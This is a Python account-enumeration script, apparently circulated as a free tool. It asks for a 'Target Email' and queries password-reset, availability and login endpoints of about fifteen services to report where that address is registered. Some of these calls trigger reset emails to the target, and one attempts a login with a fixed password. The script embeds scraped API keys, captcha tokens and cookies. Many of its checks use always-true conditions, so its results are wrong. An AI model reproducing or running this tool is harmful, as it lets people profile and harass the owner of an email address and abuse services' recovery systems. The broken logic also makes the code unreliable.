
#
# This Is Free Tool By Mr. Lyrica Alanzi AKA @8Y
# Dont Try Sell It Cuz It's Fucking Free
# Github: https://github.com/Soud69
# Instagram: https://instagram.com/8Y
# Telegram: https://t.me/Soud69
# Discord: Soud#5866
#

try:
	import os, requests, colorama
	from os import system
	from colorama import Fore
	system("title " + "Lyrica Was Here - @8Y - Soud#5866")
except Exception as m:
  print("Something Went Wrong\n")
  print(m)
  input()
  exit()

logo = """
         _______   __ 
   ____ |  _  \ \ / /
  / __ \ \ V / \ V /
 / / _` |/ _ \  \ /
| | (_| | |_| | | |
 \ \__,_\_____/ \_/
  \____/
"""
print(Fore.CYAN+logo)
print(Fore.GREEN+"Made with Love by @8Y - Soud#5866\n\n"+Fore.RESET)

email = input("[+] Enter Target Email: ")
if "@" not in email:
	print("\n[-] Enter Correct Email\n")
	input("Press Enter To Exit...")
	exit()
print(Fore.GREEN+'\n===================================\n'+Fore.RESET)
gettr = requests.post("https://api.gettr.com/m/user/verifycode/email",json={"content":{"email":email,"lang":"en","reqtype":"pwdreset"}},headers={"Host":"api.gettr.com","Accept-Encoding":"gzip, deflate, br","av":"1.0.6","User-Agent":"Gettr/31070302 CFNetwork/1240.0.4 Darwin/20.5.0",'x-app-auth':'{"user":null,"token":""}',"tablet":0,"lan":"en_US","x-api-captcha":"1b46d33fc27c53e516d703fc9d6859b6573722174043e0621b5a7eb5112df8c64cee798b005a20fa45bfb07ed4f76b67dcf420f2edcd4f4d99ebbb24f88a4fff","zn":"+03","x-app-url":"https://api.gettr.com","Connection":"keep-alive","Accept-Language":"en_US","Accept":"application/json; charset=utf-8","Content-Type":"application/json;charset=UTF-8","vc":31070302,"zone":3,"dark":0,"pt":1}).text
if "invalid email" or "email not found" in gettr:gettrlink = False
elif 'success":true' in gettr:gettrlink = True
print(f"Gettr Linked: {gettrlink}")
tellonym = requests.post("https://api.tellonym.me/accounts/forgotpassword",json={"email":email,"limit":16},headers={"tellonym-client":"ios:2.76.1:661:14:iPhone13,3","User-Agent":"Tellonym/661 CFNetwork/1240.0.4 Darwin/20.5.0"}).text
if "The email is not valid. See docs for more information" or "The entry you were looking for could not be found." in tellonym:tellonymlink = False
else:tellonymlink = True
print(f"Tellonym Linked: {tellonymlink}")
mega = requests.post("https://g.api.mega.co.nz/cs?id=-3157539522&&domain=meganz&v=2&lang=en",json=[{"a":"ere","m":email,"v":2}]).text
if "[-9]" or "[-2]" in mega:megalink = False
elif 'val":1,' in mega:megalink = True
print(f"Mega Linked: {megalink}")
soundcloud = requests.post("https://api-mobile.soundcloud.com/users/passwords/reset?client_id=Fiy8xlRI0xJNNGDLbPmGUjTpPRESPx8C",json={"email":email}).text
if "identifier_not_found" in soundcloud:soundcloudlink = False
elif "{}" in soundcloud:soundcloudlink = True
print(f"SoundCloud Linked: {soundcloudlink}")
noon = requests.post("https://api-app.noon.com/_svc/customer-v1/auth/reset-password",json={"email":email},headers={"User-Agent":"noon/1010 CFNetwork/1240.0.4 Darwin/20.5.0"}).text
if "No user found with that email address" or "Invalid email" in noon:noonlink = False
elif 'message": "ok' in noon:noonlink = True
print(f"Noon Linked: {noonlink}")
anime = requests.post("https://animecloudapp.com/aanimeApp65/",data={"command":"recoverPassword","email":email}).text
if 'status":"NotExsist' in anime:animelink = False
elif 'status":"Done' in anime:animelink = True
print(f"AnimeCloud Linked: {animelink}")
talabat = requests.post("https://api.talabat.com/api/v1/Account/ForgetPassword/1",json={"MobileNumber":"","mobileCountryCode":"965","Email":email},headers={"User-Agent":"Talabat/849 CFNetwork/1240.0.4 Darwin/20.5.0"}).text
if "Unknown exception, please contact the customer service" or "Please enter your full email address, including the '@'" in talabat:talabatlink = False
elif "An email has been sent with a link for you to change your password." in talabat:talabatlink = True
print(f"Talabat Linked: {talabatlink}")
barmej = requests.post("https://api.barmej.com/api/v1/password-reset/",json={"email":email},headers={"User-Agent":"Barmej/124 CFNetwork/1240.0.4 Darwin/20.5.0","Accept-Language":"en_US"}).text
if "email not found" or "عليك ان تدخل بريد إلكتروني صالح" in barmej:barmejlink = False
elif "يرجي التحقق من بريدك الإلكتروني للحصول على تعليمات إعادة تعيين كلمة المرور" or "Please check your email for password reset instructions" in barmej:barmejlink = True
print(f"Barmej Linked: {barmejlink}")
twitter = requests.get(f"https://api.twitter.com/i/users/email_available.json?email={email}").text
if '{"valid":true,"msg":"Available!","taken":false}' or '{"valid":false,"msg":"This email is invalid.","taken":false}' in twitter:twitterlink = False
elif '{"valid":false,"msg":"Email has already been taken.","taken":true}' in twitter:twitterlink = True
print(f"Twitter Linked: {twitterlink}")
instagram = requests.post("https://i.instagram.com/api/v1/users/check_email/",data={"android_device_id":"android-b994ff2e09c9ff83","login_nonce_map":"{}","_csrftoken":"l0LWQMPTvIG9KLoLS5Avv8JRRVISnsxz","login_nonces":"[]","email":email,"qe_id":"2061831e-5616-4fad-96de-8dcbae3b144b","waterfall_id":"aff9f04e-a4c4-4337-9ec6-73e5b804d864"},headers={"User-Agent":"Instagram 172.0.0.21.123 Android (25/7.1.2; 192dpi; 720x1280; google; G011A; G011A; qcom; en_US; 269790795)","X-IG-Connection-Type":"WIFI","X-IG-Capabilities":"3brTvx8=","Accept-Language":"en-US","X-MID":"YJhYTgAAAAFuQyqTyqJyx8wg_YAH","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Accept-Encoding":"gzip, deflate","Host":"i.instagram.com"},cookies={"mid":"YJhYTgAAAAFuQyqTyqJyx8wg_YAH","csrftoken":"EfHiktsxTmdIBSxtSbdSlAMCNNDFQdKy"}).text
if '{"valid":true,"available":true,' or 'Please enter a valid email address.' in instagram:instagramlink = False
elif '{"valid":true,"available":false,' in instagram:instagramlink = True
print(f"Instagram Linked: {instagramlink}")
cazasouq = requests.post("https://www.cazasouq.com/index.php?route=account/forgotten",data={"email":email},headers={"Host":"www.cazasouq.com","Origin":"https://www.cazasouq.com","Connection":"keep-alive","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1","Referer":"https://www.cazasouq.com/index.php?route=account/forgotten","Accept-Language":"en-us"}).text
if "تحذير : البريد الإلكتروني لم يتم العثور علية في سجلاتنا ، يرجى المحاولة مرة أخرى!" in cazasouq:cazasouqlink = False
elif "تم إرسال رابط انشاء كلمة مرور جديدة إلى بريدك الخاص." in cazasouq:cazasouqlink = True
print(f"Cazasouq Linked: {cazasouqlink}")
starzplay = requests.post("https://app-api.starzplay.com/api/auth/password/forgot",json={"username":email,"language":"en","reattempting":"false"}).text
if f'message":"username {email} is not assigned to any user."' or "The provided username is not valid." in starzplay:starzplaylink = False
elif f'"channel":"email","destination":"{email}",' in starzplay:starzplaylink = True
print(f"Starzplay Linked: {starzplaylink}")
shahid = requests.post(f"https://login.mbc.net/accounts.isAvailableLoginID?loginID={email}&APIKey=3_Pm0x4fe9XSy6gv04PewESwqZ_HLgUCbXwWWPHCbGmUGFbW1xyHa42dFt0XTVay0T&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fshahid.mbc.net%2Fen%2Fwidgets%2Flogin%3Fmobile%3Dtrue%26deviceId%3D5A67C97E-8D90-472A-9D75-1156E0F27877%26deviceSerial%3D5A67C97E-8D90-472A-9D75-1156E0F27877%26deviceType%3DMobile%26physicalDeviceType%3DIOS%26deviceName%3DSoud%25E2%2580%2599s%2520iPhone%26appVersion%3D3671%26theme%3Ddark&sdkBuild=12234&format=json").text
if 'isAvailable": true,' in shahid:shahidlink = False
elif 'isAvailable": false,' in shahid:shahidlink = True
print(f"Shahid Linked: {shahidlink}")
jawwytv = requests.post("https://jawwy2-prod.intigral-ott.net/bolt/v3/cbac757f/login/credentials",json={"userAgent":"ios","username":email,"password":"LyricaLol"},headers={"Host": "jawwy2-prod.intigral-ott.net","User-Agent": "Rocket-2-IOS"}).text
if "username does not exist" in jawwytv:jawwytvlink = False
elif "incorrect username or password" in jawwytv:jawwytvlink = True
print(f"JawwyTV Linked: {jawwytvlink}")
print("\n\n")
input("Press Enter To Exit...")
